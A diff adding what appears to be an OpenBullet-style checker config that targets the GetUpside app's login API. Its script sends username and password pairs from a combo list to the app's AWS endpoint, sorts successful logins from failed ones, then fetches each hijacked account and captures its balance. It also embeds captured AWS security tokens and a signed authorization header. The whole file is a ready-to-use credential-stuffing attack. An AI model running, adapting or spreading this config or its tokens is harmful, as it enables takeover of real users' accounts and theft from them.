@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "getupside",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-10T17:16:11.9135748+04:30",
+  "AdditionalInfo": "",
+  "Author": "sombree",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!FUNCTION Base64Encode "20200509T150002Z" 
+
+!FUNCTION UnixTimeToISO8601 "<IP>" 
+
+REQUEST POST "https://z2ni5sknta.execute-api.us-east-1.amazonaws.com/7_0_0/user/auth" 
+  CONTENT "{\"clearTextPassword\":\"<PASS>\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Amz-Date: 20200509T114019Z" 
+  HEADER "x-amz-security-token: IQoJb3JpZ2luX2VjELT//////////wEaCXVzLWVhc3QtMSJGMEQCIHNsSJgrG8dI6aiYAapX1zQNEcIAz1Mi3kH0xRD05z29AiAbsww24BoFZcdmwjLYqsCgx+PhGdlqAhIIId4JIKdiiirTBQjt//////////8BEAEaDDMzNzA2ODA4MDU3NiIM3j/e2AolIlZkK/XEKqcFITwQKIAXZfiLWmydITPzX950OG9tYJ5iDTby8ILkZFqyDPdM1+bfRqqROYPobb4lg7vYAArtzZQnh+2FflWLD9KWoEjyDH0O1lectP4ao/XbXDz/EZ0cFYr16oswiBcoDzFXE5/baSDV94c2XgqgM78//mnsUc9K6FcW9ClbgO9dvPeWEEMceurjSpde+q5OLqsjiTDSiQWVTiL8SQvUM6IOMa6pOnfxQ6JfJ+AijQTjQIgvvFxQHfiFFWBPlehY2Tz4zp1hb9eLjpVfPTgMcogmWVJGmmu4e/ixoEqlEnNIT1j/tpFQWakpFUopTA4Fwmg22EEhoLEjaA6nhUSc5osm4YG5fAwkzVw7kf2RxegAvQWnmsikqOG4i3OGH9agLbfQnrLOZ4k8cZURchvd2YA5T+Ok3Qsp0yYRVvk77AC9ChrojTFXW9sb38z/7ZKDIJ8kFDs2k8n/mEDS8Px3Yh9VWVfy+KxGQQLAJAFRtBBw/bhzWvPiSOIKv2QSg2hxAsK73H1PHxG7msL1x5TBhwi2JiPENTE5mX+gBnfBwTk0Omemq/oBE6ntCfRjPROjm4LeoccLDY5ANR0dcwgXHgMxNgb9qUR6szR1f3hLLxl0xr/Ne5HDujgZvEIKscx8xRimb7IQtMtxtV3jhP9E9HxgAV8zp5RiLJE+BBXAJDooASVCN6t0cOriJmZhTZVjmpJRq+ezVAe1kRZtFHHdYgYVX+LcbeZb5lgtEfHZTgrL1GonIuUQlFX+BXo8Xxk8p4crt6BuyGQX5tthY/dKv8gslILj2Y6BtNFy/gg+pWw8PnHh/BvSRsQ6AOGYqnQW3MC1Ip59X3R6Z1yuaQtsVqDwaxMAFLy1gbJoqBsUz3IqgTy0MImHZx20zDe9rgw3IwRyZTNwzzCjrdr1BTrOAlAzPK/HV3kRvt2mxca8WuXYfEe12DDm8QBeCMPTDSnWf/WP76tjpBewIwfZBdZ5s+1xhxSKOSGrXUrWfEiW6ebfj5PTnNPUnpK0EF4siYwnADAc0TM2mlfoEqMX0SHQqEYkfNEjxkF/8bC4qwLkQtRIg79eHTCBOh3WU7whMKppHWAwm16q2VqN1X4Go743ut5hepVQAPeEpHRVfwXvWQUQStmcTimsiU+BTzE8XH7DWR3CbVOlBddpKHVAkSuCCtoSU8kFPMQT42S2HvrsvG+8elE0rfxX6xDMMY/oM3YbsTWP3v2DAMnq/JJvkcRi0fOETV0EqSrBUY0TjD68i9BXjiKkaNo2DGd3cLRtxcc1wsMknd+0jjPYhlOzlM08YU3xTAnPwKtUlix+ZqnFJxZ5j3nEQiHlF+P/1mcTo6jx7gZNa1GYURt6mfBsNCk=" 
+  HEADER "User-Agent: aws-sdk-android/2.3.1 Linux/4.0.9+ Dalvik/2.1.0/0 en_UK MobileUIClient" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Authorization: AWS4-HMAC-SHA256 Credential=ASIAU46WSXXANVZU72TR/20200509/us-east-1/execute-api/aws4_request, SignedHeaders=host;x-amz-date;x-amz-security-token, Signature=6c1593b4e89a5c1b2ce1b730d33a5b4a4254385f858dc37e7e466e5358e41fa0" 
+  HEADER "Content-Length: 68" 
+  HEADER "Host: z2ni5sknta.execute-api.us-east-1.amazonaws.com" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "FAILED" 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+    KEY "{\"code\": \"SUCCESS" 
+
+PARSE "<SOURCE>" JSON "userUuid" -> VAR "userUuid" 
+
+FUNCTION CurrentUnixTime -> VAR "TIME" 
+
+FUNCTION UnixTimeToISO8601 "<TIME>" -> VAR "TI" 
+
+REQUEST GET "https://z2ni5sknta.execute-api.us-east-1.amazonaws.com/6_0_0/user/<userUuid>" 
+  
+  HEADER "X-Amz-Security-Token: IQoJb3JpZ2luX2VjEF0aCXVzLWVhc3QtMSJGMEQCIF+1V3XSVfG1D/L3LRu5oiyH7wt/rDBezlToIMn2wmHjAiACUHiHrU/V+lgDPpg9lsArwQZ5rlRmV4D8zQ9GqfacuirWAwiV//////////8BEAEaDDMzNzA2ODA4MDU3NiIM9lhzopqfa1KEk/OCKqoDft57x0/SBQmsJOjC8t5T3uigLhr0+U3MaBD/pYUcveBszCv3Jv0SmPry9zZnnQnkHiT1NEMVVig/WhHFhqIHczPJIuX1CKRO+bCQxRiJrJzVjk8r9THiKEmu+FPiGJiRhAFQLzRUiZqsbfuT7uG87eJQCqC6LD2OcfU7pwMARP2KD8iXobF+S+kgLuRmm8Sa/8QDNQcb56RECM7VnyONevvhvsZzoBV5nXECCRiNVKl0zgX6arVadA103swGOMzPJm4+beD1Tdw1cBVezwJxpdKEXY3jEXTnHbIt4knCKkbkLJulEdPQanC7n7AQjW4H0iR8cuWkrP1Xq/qtwC2OSGQC+RB3Jq4b9tt8Vnxi7rIBjUyPYq5HbrpzA5lSGb9JEIoMgGpr4cd1utlfyCNy4pmiEJ+cQGpO1fN7CET54VXmCsKaJqvcJInOoFiKfH9UPE6yVB7BSzPjNhwpkZD2laLs0k6n1WCAKfyKRXRorowsxRihPI/mr8vuDIpvUj24skJijQRm4OOMxWRWiTkS/5jVfAkoDqA09vjUsGXilOOSRC+7cebA5qVXMMSy++4FOswCKp+jPjiD5WkPbe99jaixQ6Wyo8o6W9lYjjAGk2tDFFmKhYramBTXMTE+miyWBD2rOvuGpHbktP52OhO8Mu+uMRsnidLQAtTpl3UOf/AJihaZdYacgQ2efKqftzzYP03DhAfPbvBmJMbzGt54nPUfa+L4i48cqKNq++yB1KBEphvCaXrF8bfWuNXrovlAEqzxPix2BQvGtcHyWrEtxDOMaLrZuoVRvmY+yCC5CVf46VX/o5/7lqANOMKKMkgwr0hFsFsHiMRVOdxPFBK1t3A+joWV+lmX1xQhIpSCS+2d4Ak5DyoIOn9mXyP6RMJUB1Lz32Vrz/YKdiy/EJRqZarde/8UgeLRIPqEc8bUpWx9UO6290JI4WH2qJTHuiI1BJWZyeIiU1vIXgicBy+04OxD9IEEs2QXsn9KvS1qey+9Dbp1DuNMaBoEClSlsLE=" 
+  HEADER "X-Amz-Date: <TI>" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: aws-sdk-iOS/2.4.16 iOS/12.1.4 en_US" 
+
+PARSE "<SOURCE>" LR "\"balance\": {\"amount\": " "," -> CAP "Balance" 
+
